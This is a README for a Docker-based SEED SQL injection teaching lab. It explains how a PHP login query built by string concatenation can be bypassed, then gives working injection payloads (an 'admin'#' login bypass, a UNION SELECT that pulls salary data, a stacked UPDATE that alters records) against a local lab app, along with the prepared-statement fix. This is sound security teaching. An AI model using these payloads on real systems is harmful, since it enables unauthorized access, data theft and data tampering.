# Lab 01 — SQL Injection Attack Lab

**Implementation Type**: Official SEED source adapted for Docker

Official lab manual: https://seedsecuritylabs.org/Labs_20.04/Web/Web_SQL_Injection/
Textbook: Chapter 12 — SQL Injection Attack (*Computer & Internet Security*, 2nd Ed., Prof. Wenliang Du)
Lecture Sync Sitemap: [SEED Lecture & Reference Sitemap](../../docs/lectures-and-references.md#2-lab-01--sql-injection-attack)
CWE Reference: [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)

For authorized educational use only.

> **HOST BROWSER ROUTING NOTICE**: Access the application in host browsers via `http://localhost:10080` (or `http://www.seed-server.com:10080` if `127.0.0.1 www.seed-server.com` is in your host hosts file). Do not use internal container IP `10.9.0.5` directly in host browsers.  
> **CONTAINER COMMAND FALLBACKS**: If `bash` is missing: `docker exec -it www-10.9.0.5 sh`. If `ip` is missing: `hostname -i`. If `ss` is missing: `netstat -tlnp`.

---

## Security Concept

### The Security Hole
The web application constructs database queries by directly concatenating raw user input strings into SQL query templates (`$sql = "SELECT * FROM credential WHERE Name='$user' AND Password='$pass'"`).

### How it Causes a Problem
Because user input is concatenated directly into the query string, an attacker can input SQL boundary characters like single quotes `'` and comment characters `#`. This alters the database query parse tree, allowing attackers to comment out password checks (`admin'#`), extract unauthorized data using `UNION SELECT`, or modify database tables.

### Attacker Action Flow

1. Attacker registers an account on the vulnerable site.
2. Attacker supplies malicious input `admin'#` in the username field, which truncates the query and comments out the password check.
3. The crafted input is stored unchanged in the database.
4. When the application executes the concatenated query, the comment prevents password verification, granting the attacker unauthorized access.
5. Attacker can now log in as the targeted user without knowing the password.

```php
 // User inputs: admin'#
 // Unsafe string concatenation builds:
 $sql = "SELECT * FROM credential WHERE Name='admin'#' AND Password='$pwd'";
 //                                                    ^
 //                                              SQL comment character (#).
 //                                         Everything after # is ignored.
 //                                         Password check is completely bypassed.
 ```

### How it is Fixed
The application must use parameterized prepared statements (`$stmt = $pdo->prepare(...)`). Prepared statements send the SQL query template to the database engine first to be compiled into an immutable parse tree. User parameters are then bound strictly as literal data values, preventing input characters from altering SQL syntax.

---

## Container Architecture

```
HOST MACHINE
  |
  | Hosts file: www.seed-server.com -> 127.0.0.1 (or localhost:10080)
  | Port mapping: host:10080 -> container:80
  |
  Docker Bridge Network: net-10.9.0.0-sqli (10.9.0.0/24)
    |
    +---- www-10.9.0.5   (Apache 2.4 + PHP + vulnerable app, Port 80)
    |         |
    |         | MySQL connection to 10.9.0.6:3306
    |         |
    +---- mysql-10.9.0.6 (MySQL 8.0 + sqllab_users database)
```

---

## Layer 1 — Docker Commands (run on your host terminal)

### Start the Lab

```bash
# Navigate to this lab directory
cd labs/01-sql-injection

# Run startup script (PowerShell on Windows)
.\start.ps1

# OR run startup script (Linux / WSL2 bash)
./start.sh

# OR build and start containers manually using Docker Compose
docker compose up -d --build
```

### Verify Container Status

```bash
# Check that both containers are running and healthy
docker compose ps

# Inspect allocated container IPs and network settings
docker inspect www-10.9.0.5
docker inspect mysql-10.9.0.6
```

### Stream Runtime Logs

```bash
# Stream Apache and MySQL logs from host (no need to enter container)
docker compose logs -f www
docker compose logs -f mysql

# View last 30 lines only
docker compose logs --tail 30 www
```

---

## Layer 2 — Linux Commands (inside the container)

### Step 1: Open a Bash Shell Inside the Web Container

```bash
docker exec -it www-10.9.0.5 bash
```

Your prompt changes from your host prompt to the container prompt:

```
Before: PS C:\> (Windows)  OR  user@host:~$ (Linux)
After:  root@www-10.9.0.5:/#
```

You are now inside the container's Linux user space.

---

### Step 2: Establish Identity

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

hostname
# www-10.9.0.5

ip addr show
# Look for eth0 showing inet 10.9.0.5/24
```

---

### Step 3: Inspect the Web Application Files

```bash
cd /var/www/html
ls -la
cat index.php
grep -n "SELECT" index.php
```

---

### Step 4: Inspect Running Processes

```bash
ps aux
ss -tlnp
```

---

### Step 5: Check Environment Variables

```bash
env
echo $MYSQL_HOST
```

---

### Step 6: View Apache Logs Inside Container

```bash
tail -f /var/log/apache2/access.log
```

---

### Step 7: Test Connectivity to MySQL Container

```bash
ping -c 3 10.9.0.6
mysql -h 10.9.0.6 -u root -pdees sqllab_users
```

---

### Step 8: Exit the Container Shell

```bash
exit
```

---

## Layer 3 — Security Tasks (browser + host terminal)

### Configure Hostname (Optional but Recommended)

**Windows — PowerShell as Administrator:**

```powershell
Add-Content "C:\Windows\System32\drivers\etc\hosts" "127.0.0.1   www.seed-server.com"
```

**Linux / WSL2:**

```bash
echo "127.0.0.1   www.seed-server.com" | sudo tee -a /etc/hosts
```

### Access the Vulnerable Application

```
http://localhost:10080          Direct — always works
http://www.seed-server.com:10080 With hosts file configured
```

---

### Task 2.1 — Authentication Bypass via Login Form

In the browser, go to the Login section and enter:

```
Username: admin'#
Password: (anything)
```

Observe successful login without knowing the password.

---

### Task 2.2 — Authentication Bypass via HTTP GET Request

```
http://www.seed-server.com:10080/unsafe_home.php?username=admin%27%23
```

---

### Task 3.1 — Data Exfiltration via UNION SELECT

```
admin' UNION SELECT 1,2,3,Salary,5,6,7,8,9,10,11 FROM credential#
```

---

### Task 3.2 — Modifying Database Records

```
admin'; UPDATE credential SET Salary=100000 WHERE Name='Alice'#
```

---

### Task 4 — Defending Against SQL Injection Using Prepared Statements

Edit `/var/www/html/index.php` inside the container or on your host machine to use PDO prepared statements:

```php
// Secure Prepared Statement Implementation
$stmt = $conn->prepare("SELECT * FROM credential WHERE Name = :name AND Password = :pass");
$stmt->bindParam(':name', $username);
$stmt->bindParam(':pass', $password);
$stmt->execute();
$result = $stmt->fetchAll();
```

Re-test `admin'#` in the login form. The attack fails because user input is treated strictly as literal data values rather than executable SQL syntax.

---

## Stop and Reset

```bash
# Stop containers but preserve database state
docker compose down

# Destroy containers AND reset database back to initial state
docker compose down -v
```
